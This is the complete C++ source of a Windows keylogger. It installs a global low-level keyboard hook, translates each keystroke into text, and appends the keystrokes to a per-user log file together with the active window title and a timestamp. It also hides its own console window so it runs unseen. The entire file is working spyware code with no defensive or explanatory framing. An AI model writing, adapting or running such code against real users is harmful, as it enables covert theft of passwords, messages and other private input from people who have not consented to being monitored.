#include <iostream>
#include <string>
#include <fstream>
#include <Windows.h>
#include <signal.h>
#include <time.h>
#include <lmcons.h>
using namespace std;

char FILENAME[256];
wchar_t prev_window[256];
wchar_t curr_window[256];

void SetFileName()
{
    char username[UNLEN + 1];
    DWORD usernamelen = UNLEN + 1;
    GetUserNameA(username, &usernamelen);
    //wstring uname(username);
    strcpy(FILENAME, username);
    strcat(FILENAME, ".log");
}

void Write(string key)
{
    wchar_t windowname[256];
    GetWindowTextW(GetForegroundWindow(), (wchar_t *)curr_window, sizeof(curr_window));

    ofstream fout(FILENAME, ios::app);
    if (fout.is_open())
    {
        string towrite = "";
        if (wcscmp(prev_window, curr_window) != 0) //current window != previous window
        {
            wstring _cwindow(curr_window);
            string temp(_cwindow.begin(), _cwindow.end());
            towrite += "\n"+temp;
            towrite += "\t";
            time_t current_time = time(NULL);
            char *dt = ctime(&current_time);
            towrite += dt;
            towrite += "\t";
            towrite += key;
            wcscpy(prev_window, curr_window);
        }
        else
            towrite += key;
        fout.write(towrite.c_str(), towrite.length());
        fout.close();
    }
    else
        cout << "\nUnable to open file\n";
}

bool shift = false, caps = false, numlock = false;

LRESULT CALLBACK LowLevelKeyboardProc(int nCode,                    // hook code, used to determine action to perform
                                      WPARAM wParam, LPARAM lParam) // both depend on hook code, contain msg info
{
    if (nCode == HC_ACTION)
    {
        KBDLLHOOKSTRUCT *key = (KBDLLHOOKSTRUCT *)lParam;
        if (key->vkCode == VK_LSHIFT || key->vkCode == VK_RSHIFT)
            shift = (wParam == WM_KEYDOWN ? true : false);
        else if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
        {
            switch (key->vkCode)
            {
            case 0x41:
            {
                Write(wParam==WM_SYSKEYDOWN? "ā": (caps ? (shift ? "a" : "A") : (shift ? "A" : "a")));
                break;
            }
            case 0x42:
            {
                Write(caps ? (shift ? "b" : "B") : (shift ? "B" : "b"));
                break;
            }
            case 0x43:
            {
                Write(caps ? (shift ? "c" : "C") : (shift ? "C" : "c"));
                break;
            }
            case 0x44:
            {
                Write(wParam == WM_SYSKEYDOWN ? "ḍ" : (caps ? (shift ? "d" : "D") : (shift ? "D" : "d")));
                break;
            }
            case 0x45:
            {
                Write(wParam == WM_SYSKEYDOWN ? "ē" : (caps ? (shift ? "e" : "E") : (shift ? "E" : "e")));
                break;
            }
            case 0x46:
            {
                Write(caps ? (shift ? "f" : "F") : (shift ? "F" : "f"));
                break;
            }
            case 0x47:
            {
                Write(wParam == WM_SYSKEYDOWN ? "ṅ" : (caps ? (shift ? "g" : "G") : (shift ? "G" : "g")));
                break;
            }
            case 0x48:
            {
                Write(wParam == WM_SYSKEYDOWN ? "ḥ" : (caps ? (shift ? "h" : "H") : (shift ? "H" : "h")));
                break;
            }
            case 0x49:
            {
                Write(wParam == WM_SYSKEYDOWN ? "ī" : (caps ? (shift ? "i" : "I") : (shift ? "I" : "i")));
                break;
            }
            case 0x4A:
            {
                Write(caps ? (shift ? "j" : "J") : (shift ? "J" : "j"));
                break;
            }
            case 0x4B:
            {
                Write(caps ? (shift ? "k" : "K") : (shift ? "K" : "k"));
                break;
            }
            case 0x4C:
            {
                Write(wParam == WM_SYSKEYDOWN ? "l̥" : (caps ? (shift ? "l" : "L") : (shift ? "L" : "l")));
                break;
            }
            case 0x4D:
            {
                Write(wParam == WM_SYSKEYDOWN ? "ṁ" : (caps ? (shift ? "m" : "M") : (shift ? "M" : "m")));
                break;
            }
            case 0x4E:
            {
                Write(wParam == WM_SYSKEYDOWN ? "ṇ" : (caps ? (shift ? "n" : "N") : (shift ? "N" : "n")));
                break;
            }
            case 0x4F:
            {
                Write(wParam == WM_SYSKEYDOWN ? "ō" : (caps ? (shift ? "o" : "O") : (shift ? "O" : "o")));
                break;
            }
            case 0x50:
            {
                Write(caps ? (shift ? "p" : "P") : (shift ? "P" : "p"));
                break;
            }
            case 0x51:
            {
                Write(wParam == WM_SYSKEYDOWN ? "æ" : (caps ? (shift ? "q" : "Q") : (shift ? "Q" : "q")));
                break;
            }
            case 0x52:
            {
                Write(wParam == WM_SYSKEYDOWN ? "r̥" : (caps ? (shift ? "r" : "R") : (shift ? "R" : "r")));
                break;
            }
            case 0x53:
            {
                Write(wParam == WM_SYSKEYDOWN ? "ś" : (caps ? (shift ? "s" : "S") : (shift ? "S" : "s")));
                break;
            }
            case 0x54:
            {
                Write(wParam == WM_SYSKEYDOWN ? "ṭ" : (caps ? (shift ? "t" : "T") : (shift ? "T" : "t")));
                break;
            }
            case 0x55:
            {
                Write(wParam == WM_SYSKEYDOWN ? "ū" : (caps ? (shift ? "u" : "U") : (shift ? "U" : "u")));
                break;
            }
            case 0x56:
            {
                Write(caps ? (shift ? "v" : "V") : (shift ? "V" : "v"));
                break;
            }
            case 0x57:
            {
                Write(caps ? (shift ? "w" : "W") : (shift ? "W" : "w"));
                break;
            }
            case 0x58:
            {
                Write(wParam == WM_SYSKEYDOWN ? "ṣ" : (caps ? (shift ? "x" : "X") : (shift ? "X" : "x")));
                break;
            }
            case 0x59:
            {
                Write(wParam == WM_SYSKEYDOWN ? "ñ" : (caps ? (shift ? "y" : "Y") : (shift ? "Y" : "y")));
                break;
            }
            case 0x5A:
            {
                Write(caps ? (shift ? "z" : "Z") : (shift ? "Z" : "z"));
                break;
            }
            case 0x30:
            {
                Write(shift ? ")" : "0");
                break;
            }
            case 0x31:
            {
                Write(shift ? "!" : "1");
                break;
            }
            case 0x32:
            {
                Write(shift ? "@" : "2");
                break;
            }
            case 0x33:
            {
                Write(shift ? "#" : "3");
                break;
            }
            case 0x34:
            {
                Write(shift ? "$" : "4");
                break;
            }
            case 0x35:
            {
                Write(shift ? "%" : "5");
                break;
            }
            case 0x36:
            {
                Write(shift ? "^" : "6");
                break;
            }
            case 0x37:
            {
                Write(shift ? "&" : "7");
                break;
            }
            case 0x38:
            {
                Write(shift ? "*" : "8");
                break;
            }
            case 0x39:
            {
                Write(shift ? "(" : "9");
                break;
            }
            case VK_OEM_1:
            {
                Write(shift ? ":" : ";");
                break;
            }
            case VK_OEM_2:
            {
                Write(shift ? "?" : "/");
                break;
            }
            case VK_OEM_3:
            {
                Write(shift ? "~" : "`");
                break;
            }
            case VK_OEM_4:
            {
                Write(shift ? "{" : "[");
                break;
            }
            case VK_OEM_5:
            {
                Write(shift ? "|" : "\\");
                break;
            }
            case VK_OEM_6:
            {
                Write(shift ? "}" : "]");
                break;
            }
            case VK_OEM_7:
            {
                Write(shift ? "\"" : "'");
                break;
            }
            case VK_OEM_PLUS:
            {
                Write(shift ? "+" : "=");
                break;
            }
            case VK_OEM_COMMA:
            {
                Write(shift ? "<" : ",");
                break;
            }
            case VK_OEM_MINUS:
            {
                Write(shift ? "_" : "-");
                break;
            }
            case VK_OEM_PERIOD:
            {
                Write(shift ? ">" : ".");
                break;
            }
            case VK_SPACE:
            {
                Write(" ");
                break;
            }
            case VK_NUMPAD0:
            {
                Write("0");
                break;
            }
            case VK_NUMPAD1:
            {
                Write("1");
                break;
            }
            case VK_NUMPAD2:
            {
                Write("2");
                break;
            }
            case VK_NUMPAD3:
            {
                Write("3");
                break;
            }
            case VK_NUMPAD4:
            {
                Write("4");
                break;
            }
            case VK_NUMPAD5:
            {
                Write("5");
                break;
            }
            case VK_NUMPAD6:
            {
                Write("6");
                break;
            }
            case VK_NUMPAD7:
            {
                Write("7");
                break;
            }
            case VK_NUMPAD8:
            {
                Write("8");
                break;
            }
            case VK_NUMPAD9:
            {
                Write("9");
                break;
            }
            case VK_MULTIPLY:
            {
                Write("*");
                break;
            }
            case VK_ADD:
            {
                Write("+");
                break;
            }
            case VK_SUBTRACT:
            {
                Write("-");
                break;
            }
            case VK_DECIMAL:
            {
                Write(",");
                break;
            }
            case VK_DIVIDE:
            {
                Write("/");
                break;
            }
            case VK_BACK:
            {
                Write("[BACKSPACE]");
                break;
            }
            case VK_TAB:
            {
                Write("[TAB]");
                break;
            }
            case VK_RETURN:
            {
                Write("[ENTER]");
                break;
            }
            case VK_MENU:
            {
                Write("[ALT]");
                break;
            }
            case VK_ESCAPE:
            {
                Write("[ESC]");
                break;
            }
            case VK_PRIOR:
            {
                Write("[PG UP]");
                break;
            }
            case VK_NEXT:
            {
                Write("[PG DN]");
                break;
            }
            case VK_END:
            {
                Write("[END]");
                break;
            }
            case VK_HOME:
            {
                Write("[HOME]");
                break;
            }
            case VK_LEFT:
            {
                Write("[LEFT]");
                break;
            }
            case VK_UP:
            {
                Write("[UP]");
                break;
            }
            case VK_RIGHT:
            {
                Write("[RIGHT]");
                break;
            }
            case VK_DOWN:
            {
                Write("[DOWN]");
                break;
            }
            case VK_PRINT:
            {
                Write("[PRINT]");
                break;
            }
            case VK_SNAPSHOT:
            {
                Write("[PRT SC]");
                break;
            }
            case VK_INSERT:
            {
                Write("[INSERT]");
                break;
            }
            case VK_DELETE:
            {
                Write("[DELETE]");
                break;
            }
            case VK_LWIN:
            {
                Write("[WIN KEY]");
                break;
            }
            case VK_RWIN:
            {
                Write("[WIN KEY]");
                break;
            }
            case VK_CAPITAL:
            {
                caps = !caps;
                break;
            }
            case VK_NUMLOCK:
            {
                numlock = !numlock;
                break;
            }
            case VK_LCONTROL:
            {
                if (wParam == WM_KEYDOWN)
                {
                    Write("[CTRL]");
                }
                break;
            }
            case VK_RCONTROL:
            {
                if (wParam == WM_KEYDOWN)
                {
                    Write("[CTRL]");
                }
                break;
            }
            case VK_F1:
            {
                Write("[F1]");
                break;
            }
            case VK_F2:
            {
                Write("[F2]");
                break;
            }
            case VK_F3:
            {
                Write("[F3]");
                break;
            }
            case VK_F4:
            {
                Write("[F4]");
                break;
            }
            case VK_F5:
            {
                Write("[F5]");
                break;
            }
            case VK_F6:
            {
                Write("[F6]");
                break;
            }
            case VK_F7:
            {
                Write("[F7]");
                break;
            }
            case VK_F8:
            {
                Write("[F8]");
                break;
            }
            case VK_F9:
            {
                Write("[F9]");
                break;
            }
            case VK_F10:
            {
                Write("[F10]");
                break;
            }
            case VK_F11:
            {
                Write("[F11]");
                break;
            }
            case VK_F12:
            {
                Write("[F12]");
                break;
            }
            case VK_VOLUME_DOWN:{
                Write("[VOL DOWN]");
                break;
            }
            case VK_VOLUME_UP:
            {
                Write("[VOL UP]");
                break;
            }
            case VK_VOLUME_MUTE:
            {
                Write("[VOL MUTE]");
                break;
            }
            case VK_MEDIA_PLAY_PAUSE: 
            {
                Write("[PLAY/PAUSE]");
                break;
            } 
            default: //handling any other 'extended keys'
            {
                DWORD dWord = key->scanCode << 16; //scancode is from bit 16-23 in lParam (scancode != virtual key code)
                dWord += key->flags << 24; //Extended key flag lies at bit 24
                char otherKey[16] = "";
                if (GetKeyNameTextA(dWord, otherKey, sizeof(otherKey)) != 0)
                    Write(otherKey);
            }
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam); //compulsory call to next hook procedure (in this case there is no next hook procedure, hence first parameter is NULL)
}

void HookUnhook()
{
    HHOOK hook = SetWindowsHookExA(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (hook != NULL)
    {
        cout << "\nHook installed successfully\n";
        MSG msg = {};
        caps = GetKeyState(VK_CAPITAL);
        numlock = GetKeyState(VK_NUMLOCK);
        BOOL mret;
        while((mret = GetMessage(&msg, NULL, 0, 0))!=0){
            if(mret==-1){
                perror("Error occured with GetMessage. Terminating...");
                exit(EXIT_FAILURE);
            }
            else{
                TranslateMessage(&msg);
                DispatchMessage(&msg);
            }
        }

        if(UnhookWindowsHookEx(hook)==0)
            cout << "Error uninstalling hook procedure";
        CloseHandle(hook);
    }
    else
        cout << "\nError creating hook\n";
}

DWORD tid = 0;

void RemoveHookThread(int code)
{
    if (PostThreadMessageA(tid, WM_QUIT, (WPARAM)NULL, (LPARAM)NULL) == 0)
    {
        printf("\nCannot send the WM_QUIT message to the hook thread\n");
        exit(EXIT_FAILURE);
    }
}

void CreateHookThread()
{
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)HookUnhook, (void *)NULL, 0, &tid);
    if (hThread == NULL)
    {
        printf("Cannot create a new hook thread\n");
    }
    else
    {
        signal(SIGINT, RemoveHookThread);
        WaitForSingleObject(hThread, INFINITE);
        signal(SIGINT, SIG_DFL);
        CloseHandle(hThread);
    }
}

void HideWindow()
{
    HWND hWindow = GetConsoleWindow();
    if (hWindow != NULL)
    {
        if (IsWindowVisible(hWindow) != 0)
        {
            ShowWindow(hWindow, SW_HIDE);
        }
        CloseHandle(hWindow);
    }
}

int main()
{
    SetFileName();
    HideWindow();
    CreateHookThread();
    return 0;
}